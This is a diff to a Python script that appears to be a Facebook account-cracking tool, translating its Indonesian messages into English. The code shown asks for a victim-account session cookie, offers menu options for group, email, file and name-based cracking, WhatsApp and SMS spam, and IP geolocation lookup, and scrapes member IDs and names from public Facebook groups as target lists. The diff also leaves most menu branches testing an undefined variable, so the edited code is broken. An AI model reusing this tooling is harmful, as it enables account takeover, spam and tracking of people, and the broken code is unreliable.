@@ -216,7 +216,7 @@ def login():
 		
 def login_lagi334():
 	try:
-		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold white"))
+		cetak(nel('It is recommended to use cookies that are still fresh to Crack Account',width=90,style=f"bold white"))
 		your_cookies = input(' [+] Masukan Cookie : ')
 		with requests.Session() as r:
 			try:
@@ -293,33 +293,33 @@ def menu(my_name,my_id):
 	_____Fi5her___xd____ = input(f' [+] Pilih Menu Crack : ')
 	if _____Fi5her___xd____ in ['1','01']:
 		brayen_dump()
-	elif _____Fi5her___xd____ in ['2','02']:
+	elif ___Fi5her___ in ['2','02']:
 		dump_massal()
-	elif _____Fi5her___xd____ in ['3','03']:
+	elif ___Fi5her___ in ['3','03']:
 		crack_group()
-	elif _____Fi5her___xd____ in ['4','04']:
+	elif ___Fi5her___ in ['4','04']:
 		crack_email()
-	elif _____Fi5her___xd____ in ['5','05']:
+	elif ___Fi5her___ in ['5','05']:
 		crack_file()
-	elif _____Fi5her___xd____ in ['6','06']:
+	elif ___Fi5her___ in ['6','06']:
 		crack_nama()
-	elif _____Fi5her___xd____ in ['7','07']:
+	elif ___Fi5her___ in ['7','07']:
 		pengikut()
-	elif _____Fi5her___xd____ in ['8','08']:
+	elif ___Fi5her___ in ['8','08']:
 		komen()
-	elif _____Fi5her___xd____ in ['9','09']:
+	elif ___Fi5her___ in ['9','09']:
 		file_cp()
-	elif _____Fi5her___xd____ in ['10']:
+	elif ___Fi5her___ in ['10']:
 		result()
-	elif _____Fi5her___xd____ in ['11']:
+	elif ___Fi5her___ in ['11']:
 		siu()
-	elif _____Fi5her___xd____ in('12'):
+	elif ___Fi5her___ in('12'):
 		spam_wa()
-	elif _____Fi5her___xd____ in('13'):
+	elif ___Fi5her___ in('13'):
 		spam_sms()
-	elif _____Fi5her___xd____ in('14'):
+	elif ___Fi5her___ in('14'):
 		lacakip()
-	elif _____Fi5her___xd____ in ['15']:
+	elif ___Fi5her___ in ['15']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
 		print(f' [+] {m}Sukses Logout+Hapus Cookies{x}')
@@ -376,29 +376,29 @@ def lacakip():
 		request = requests.get(url)
 		response = request.json()
 	except (requests.ConnectionError):
-		print(" [+] Koneksi Error")
+		print(" [+]Connection Error")
 		exit()
 	if response['status'] == 'success':
 		print('')
-		print(" [+] Alamat IP : " + response['query'])
+		print(" [+] IP address : " + response['query'])
 		print(" [+] Kota : " + response['city'])
-		print(" [+] Negara : " + response['country'])
-		print(" [+] Kode Negara : " + response['countryCode'])
+		print(" [+] Country : " + response['country'])
+		print(" [+] Country code : " + response['countryCode'])
 		print(" [+] Latitude : " + str(response['lat']))
 		print(" [+] Longitude : " + str(response['lon']))
 		print(" [+] ISP : " + response['isp'])
 		print(" [+] Link Google Maps :", google_maps_url)
 	else:
-		print(" [+] Alamat IP Yang Dimasukkan Salah")
+		print(" [+] Incorrect IP Address Entered")
 #-----------------[ CRACK GRUP ]-----------------# 
 def crack_group():
-	cetak(nel(' Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,padding=(0,8),style=f"bold white"))
+	cetak(nel(' Enter Idz Group Make sure the group is public not private',width=90,padding=(0,8),style=f"bold white"))
 	link = input(f' [+] Id Group : ')
 	url = 'https://mbasic.facebook.com/'+link
 	try:dump_grup(url)
 	except KeyboardInterrupt:atur_atur()
 	if len(dump)==0:
-		exit(f' [+] Gagal Dhump Id Grup, Kemungkinan Grup Private')
+		exit(f' [+] Failed to Dump Group Id, Possible Private Group')
 	setting()
 
 def dump_grup(url):
@@ -408,13 +408,13 @@ def dump_grup(url):
 			par = x.text
 			if ">" in par.split(" ") or "mengajukan" in par.split(" "):
 				id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
-				if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
+				if " asking question ." in par:nama = par.replace(" asking question .","")
 				else:nama = par.split(" > ")[0]
 				if id+"|"+nama in dump:pass
 				else:dump.append(id+"|"+nama)
-				print(f'\r [+] Mengumpulkan {len(id)} Idz...');sys.stdout.flush()
+				print(f'\r [+] Gather {len(id)} Idz...');sys.stdout.flush()
 		for z in data.find_all("a"):
-			if "Lihat Postingan Lainnya</span" in str(z).split(">"):
+			if "See More Posts</span" in str(z).split(">"):
 				href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
 				dump_grup("https://m.facebook.com"+href)
 	except:dump_grup(url)
